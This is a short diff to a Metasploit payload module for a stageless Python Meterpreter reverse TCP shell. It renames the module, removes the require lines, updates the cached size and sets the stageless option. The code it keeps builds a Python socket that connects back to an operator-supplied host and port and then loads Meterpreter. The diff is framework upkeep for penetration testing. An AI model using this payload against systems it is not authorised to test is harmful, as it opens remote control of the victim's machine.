@@ -1,18 +1,12 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
-require 'msf/core/handler/reverse_tcp'
-require 'msf/core/payload/python'
-require 'msf/core/payload/python/meterpreter_loader'
-require 'msf/core/payload/python/reverse_tcp'
-require 'msf/base/sessions/meterpreter_python'
 
-module Metasploit4
+module MetasploitModule
 
-  CachedSize = 50978
+  CachedSize = 116957
 
   include Msf::Payload::Single
   include Msf::Payload::Python
@@ -36,9 +30,9 @@ module Metasploit4
     socket_setup  = "s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n"
     socket_setup << "s.connect(('#{opts[:host]}',#{opts[:port]}))\n"
     opts[:stageless_tcp_socket_setup] = socket_setup
+    opts[:stageless] = true
 
     met = stage_meterpreter(opts)
     py_create_exec_stub(met)
   end
-
 end
